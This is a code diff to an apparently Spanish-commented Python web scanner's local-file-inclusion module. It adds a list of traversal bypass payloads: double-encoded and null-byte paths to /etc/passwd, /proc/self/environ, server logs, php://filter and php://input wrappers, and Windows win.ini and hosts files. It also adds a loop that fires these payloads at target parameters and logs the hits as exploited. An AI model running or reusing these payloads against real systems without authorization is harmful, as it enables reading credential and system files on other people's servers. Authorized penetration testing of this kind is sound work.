@@ -58,6 +58,14 @@ def is_lfi_response(text):
     if any(indicator in text for indicator in passwd_indicators):
         return True
 
+    # Contenido de archivos Windows → LFI en Windows
+    windows_indicators = [
+        '[fonts]', '[extensions]', 'for 16-bit app support',
+        'c:\\windows\\', 'system32\\drivers\\etc',
+    ]
+    if any(ind in text_lower for ind in windows_indicators):
+        return True
+
     # Errores de PHP/filesystem que evidencian path traversal activo
     # "Permission denied" y "Operation not permitted" confirman que el traversal
     # llegó al archivo pero fue bloqueado por permisos del SO → LFI parcial
@@ -72,6 +80,58 @@ def is_lfi_response(text):
     ]
     error_count = sum(1 for error in lfi_errors if error in text_lower)
     return error_count >= 2
+
+
+# ---------------------------------------------------------------------------
+# BYPASS PAYLOADS PARA LFI
+# Cubren: doble encoding, null byte, rutas alternativas, PHP wrappers.
+# ---------------------------------------------------------------------------
+
+_LFI_BYPASS_PAYLOADS: list = [
+    # Double encoding
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    # Null byte (PHP < 5.3)
+    "../../../etc/passwd%00",
+    "../../../../etc/passwd%00.jpg",
+    # Rutas alternativas Linux
+    "....//....//....//etc/passwd",
+    "..\/..\/..\/etc/passwd",
+    "/proc/self/environ",
+    "/proc/version",
+    "/var/log/apache2/access.log",
+    "/var/log/nginx/access.log",
+    # PHP wrappers (cuando open_basedir está activo)
+    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
+    "php://filter/read=string.rot13/resource=../../../etc/passwd",
+    "php://input",
+    # Windows
+    "..\\..\\..\\windows\\win.ini",
+    "../../../../windows/win.ini",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+]
+
+# Indicadores de que hubo actividad de traversal (para activar bypass layer)
+_LFI_PARTIAL_INDICATORS: list = [
+    'open_basedir restriction',
+    'failed to open stream',
+    'no such file',
+    'permission denied',
+    'warning: include',
+    'warning: require',
+    'warning: file_get_contents',
+]
+
+
+def _lfi_has_partial_evidence(text: str) -> bool:
+    """Retorna True si la respuesta tiene indicios de traversal activo pero no exitoso."""
+    lower = text.lower()
+    return any(ind in lower for ind in _LFI_PARTIAL_INDICATORS)
+
+
+def _lfi_needs_php_wrapper(text: str) -> bool:
+    """Retorna True si la respuesta indica open_basedir → probar PHP wrappers."""
+    return "open_basedir restriction" in text.lower()
 
 def get_baseline_response(method, url, data=None, custom_headers=None, random_agent=False):
     headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
@@ -156,23 +216,57 @@ def lfi(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
                 else:
                     r = requests.get(base_url, params=data, headers=headers, verify=False, timeout=timeout)
 
-                # Solo procesar si la respuesta es exitosa
-                if r.status_code == 200 and is_lfi_response(r.text) and r.text != baseline_cache[baseline_key]:
-                    # Verificar si ya se explotó esta combinación específica
+                baseline = baseline_cache[baseline_key]
+
+                # ── CAPA 1: detección directa ──────────────────────────────
+                if r.status_code == 200 and is_lfi_response(r.text) and r.text != baseline:
                     if not vuln_manager.is_already_exploited(base_url, param):
-                        # Verificar falso positivo
                         if not vuln_manager.verify_false_positive(base_url, payload, method.upper(), custom_headers, random_agent):
-                            # Marcar como explotada
                             vuln_manager.mark_as_exploited(base_url, param)
                             vuln_manager.mark_as_exploited(base_url, base_url_only=True)
-                            
                             encoded = quote_plus(payload)
                             print_vulnerability(f"\033[1;32m[{method.upper()}] [VULNERABLE]{Fore.RESET} {base_url}?{param}={encoded}")
                             urls_vulnerables.append(f"{base_url}?{param}={encoded}")
-                            # CORTAR INMEDIATAMENTE - no probar más payloads en esta URL
                             current += 1
                             update_progress(current, total_tasks)
                             return
+
+                # ── CAPA 2: bypass de path traversal/PHP wrappers ──────────
+                # Solo activar si hay evidencia parcial de traversal activo
+                elif (r.status_code == 200
+                      and r.text != baseline
+                      and _lfi_has_partial_evidence(r.text)
+                      and not vuln_manager.is_already_exploited(base_url, param)):
+                    # Si open_basedir detectado → priorizar PHP wrappers
+                    if _lfi_needs_php_wrapper(r.text):
+                        bypass_candidates = [p for p in _LFI_BYPASS_PAYLOADS if p.startswith("php://")]
+                    else:
+                        bypass_candidates = _LFI_BYPASS_PAYLOADS
+                    for bp in bypass_candidates[:6]:  # Máx 6 extra para no sobrecargar
+                        bp_data = {param: bp}
+                        try:
+                            if method == "post":
+                                rb = requests.post(base_url, data=bp_data, headers=headers,
+                                                   verify=False, timeout=timeout)
+                            else:
+                                rb = requests.get(base_url, params=bp_data, headers=headers,
+                                                  verify=False, timeout=timeout)
+                            if rb.status_code == 200 and is_lfi_response(rb.text) and rb.text != baseline:
+                                if not vuln_manager.is_already_exploited(base_url, param):
+                                    vuln_manager.mark_as_exploited(base_url, param)
+                                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                                    encoded = quote_plus(bp)
+                                    print_vulnerability(f"\033[1;32m[{method.upper()}-BYPASS] [VULNERABLE]{Fore.RESET} {base_url}?{param}={encoded}")
+                                    entry = f"{base_url}?{param}={encoded}"
+                                    entry += f"|||BYPASS_TECHNIQUE:LFI-BYPASS|||BYPASS_ORIGINAL:{quote_plus(payload)}"
+                                    urls_vulnerables.append(entry)
+                                    with lock:
+                                        current += 1
+                                        update_progress(current, total_tasks)
+                                    return
+                        except Exception:
+                            continue
+
             except requests.exceptions.Timeout:
                 continue  # Skip timeouts
             except requests.exceptions.RequestException:
